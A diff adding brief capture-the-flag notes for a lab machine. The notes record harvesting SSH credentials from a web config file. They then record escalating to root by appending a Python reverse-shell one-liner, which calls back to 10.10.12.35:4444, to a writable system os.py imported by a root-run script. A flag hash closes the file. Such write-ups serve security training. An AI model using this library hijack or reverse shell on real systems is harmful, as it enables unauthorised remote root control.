@@ -1,0 +1,33 @@
+#10.10.10.123
+--------------
+
+#after getting shell
+
+#check /var/www/
+#found one file 'mysql_data.conf'
+#USER= friend		(cred for ssh)
+#PASSWD= Agpyu12!0.213$
+
+#ssh login
+ssh friend@10.10.10.123
+
+#inside 'friend' user
+#check running process
+ps aux
+#found files --> reporter.py
+#we can't write into this file
+#there is python 'os' module is used.
+#search os.py
+find / -name os.py 2>/dev/null
+#found directory  -->   /usr/lib/python2.7/os.py
+#os.py has full permission
+#add reverse shell cmd at the end
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.12.35",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
+
+#start listner at 4444
+
+#Got shell as root
+
+#key
+b0e6c60b82cf96e9855ac1656a9e90c7
+
